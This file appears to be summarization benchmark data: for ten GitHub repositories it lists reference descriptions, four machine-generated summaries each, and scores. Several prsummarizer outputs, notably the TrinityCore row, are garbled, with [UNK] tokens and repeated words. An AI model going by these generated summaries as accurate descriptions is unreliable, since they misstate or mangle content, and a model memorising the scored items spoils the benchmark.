,id,link,summary,lex_rank,edmunson,lead_cm,prsummarizer,lead_cm score,prsummarizer score
932,136736712,https://api.github.com/repos/FighterLightning/ESTabBarController,":octocat: ESTabBarController is a Swift model for customize UI, badge and adding animation to tabbar items. Support lottie!",in estabbarcontroller add container views to uitabbar to be compatible with these two ways。 6 customizable style with estabbarcontroller you can： 1. customize selected items color and style 2. add selecting animation 3. customize items background color 4. add highlight animation 5. add animation to prompt users 6. and much more ... 7 customizable items size customizable click event you can easily customize items size using estabbarcontroller.,中文介绍 estabbarcontroller is a highly customizable tabbarcontroller component which is inherited from uitabbarcontroller.,中文介绍 estabbarcontroller is a highly customizable tabbarcontroller component which is inherited from uitabbarcontroller. why in realworld development we may encounter the situation that customizing the,highly customizable customizable tabbarcontroller component which is inherited to is inherited from uitabbarcontroller in uitabbarcontroller,0.16032000000000002,0.08080666666666667
933,137464413,https://api.github.com/repos/tristanbnewman/node-3-mini,A node mini project to introduce connecting to a database in a node project.,instructions create a file named .env make sure to add .env to your .gitignore open your .env and add a variable named serverport and set it to 3000. add a variable named connectionstring that equals the uri connection string from your heroku database.,project summary in this project we will go over how to use massive with a node server to connect to a postgres database.,project summary in this project we will go over how to use massive with a node server to connect to a postgres database. setup run,[UNK] project to use how to use massive with a node server to connect to a,0.34465,0.38413
934,137415263,https://api.github.com/repos/CrackerCat/Adhrit,Adhrit is an open source Android APK reversing and analysis tool that can help security researchers and CTF enthusiasts alike. The tool is an effort to cut down on the amount of time spent on reversing and basic reconnaissance of Android applications.,adhrit is an open source android apk reversing and analysis tool that can help security researchers and ctf enthusiasts alike.,adhrit is an open source android apk reversing and analysis tool that can help security researchers and ctf enthusiasts alike.,adhrit is an open source android apk reversing and analysis tool that can help security researchers and ctf enthusiasts alike. the tool is an effort,open source apk reversing and analysis tool that can help security researchers and ctf enthusiasts alike the tool to cut down on the amount of time spent on android applications,0.7436666666666666,0.8031799999999999
935,137484066,https://api.github.com/repos/amirunpri2018/CometTS,Comet Time Series Toolset for working with a time-series of remote sensing imagery and user defined polygons,comet time series cometts visualizer installation instructions dependencies license base functionality the comet time series tool is an open source jupyter notebook and command line utility that enables users to visualize or extract relevant statistics from a time series of overhead imagery within a specific area.,comet time series cometts visualizer installation instructions dependencies license base functionality the comet time series tool is an open source jupyter notebook and command line utility that enables users to visualize or extract relevant statistics from a time series of overhead imagery within a specific area.,comet time series cometts visualizer installation instructions dependencies license base functionality the comet time series tool is an open source jupyter notebook and command line,open source notebook and command line utility that enables users to visualize or extract relevant statistics from a time series of overhead imagery,0.23482666666666666,0.24640333333333334
936,136714503,https://api.github.com/repos/ktquez/sarala-json-api-data-formatter,Simple and fluent framework agnostic javascript library to transform standard JSON API responses to simple JSON objects and vice versa.,saralajsonapidataformatter a fluent frameworkagnostic javascript library that can be used simply to transform standard json api responses to simple json objects and vice versa.,saralajsonapidataformatter a fluent frameworkagnostic javascript library that can be used simply to transform standard json api responses to simple json objects and vice versa.,saralajsonapidataformatter a fluent frameworkagnostic javascript library that can be used simply to transform standard json api responses to simple json objects and vice versa. install,fluent fluent javascript library that can be used simply to transform standard json api responses to simple json objects and vice versa,0.6756233333333334,0.7246
937,136713841,https://api.github.com/repos/jerry120/SwipeBackLayout,An Android library that help you to build app with swipe back gesture.,to enable swipebacklayout you can simply make your extend in method should be called as usual.,swipebacklayout an android library that help you to build app with swipe back gesture.,swipebacklayout an android library that help you to build app with swipe back gesture. demo apk googleplay requirement the latest androidsupportv4.jar should be referenced by,android library that help you to build app with swipe back,0.6606633333333333,0.9141366666666667
938,136750235,https://api.github.com/repos/ianrumac/audio_service,Flutter plugin to play audio in the background while the screen is off.,audioservice play audio in the background.,audioservice play audio in the background.,audioservice play audio in the background. continues playing while the screen is off or the app is in the background control playback from your flutter,play plugin for playing with the audio in the flutter,0.5165700000000001,0.41131999999999996
939,137551638,https://api.github.com/repos/woofpc/--shots,"Simple, minimalistic, and task-focused application for creating screenshots. Available for LInux, MacOS, WIndows",if you want to use it you must to see how can i save screenshots on my own server taskfocused application for creating screenshots.,shots project is not maintainable.,shots project is not maintainable. if you want to use it you must to see how can i save screenshots on my own server taskfocused,project for running [UNK] to clipboard with [UNK],0.034186666666666664,0.06060666666666667
940,136602524,https://api.github.com/repos/vitaliygerasymchuk/AndroidSlidingUpPanel,This library provides a simple way to add a draggable sliding up panel (popularized by Google Music and Google Maps) to your Android application. Brought to you by Umano.,panelslidelistener has a new format multiple of them can be set now fixed the settouchenabled bug 3.2.1 add support for umanoscrollinterpolator add support for percentagebased sliding panel height using layoutweight attribute add scrollableviewhelper to allow users extend support for new types of scrollable views.,note we are not actively responding to issues right now.,note we are not actively responding to issues right now. if you find a bug please submit a pr. android sliding up panel this library,simple library to add a draggable sliding panel popularized by google music and google maps to your android application,0.22364333333333333,0.7312766666666667
941,136919641,https://api.github.com/repos/SilverKat/TrinityCoreCustomChanges,"TrinityCore 3.3.5a custom patches, read wiki to get diffs",submitting fixes c fixes are submitted as pull requests via github.,trinitycore master build status introduction requirements install reporting issues submitting fixes copyright authors contributors links build status master 3.3.5 introduction trinitycore is a mmorpg framework based mostly in c. it is derived from mangos the massive network game object server and is based on the code of that project with extensive changes over time to optimize improve and cleanup the codebase at the same time as improving the ingame mechanics and functionality.,trinitycore master build status introduction requirements install reporting issues submitting fixes copyright authors contributors links build status master 3.3.5 introduction trinitycore is a mmorpg framework,mmorpg is a framework based mostly in c it is derived from c the massive network game object object object server and is based based on the code of the code network object server [UNK] [UNK] [UNK] and [UNK] project with extensive changes over open code game over the code game game game server and that is based on [UNK] to after improve and cleanup,0.12377666666666667,0.01754
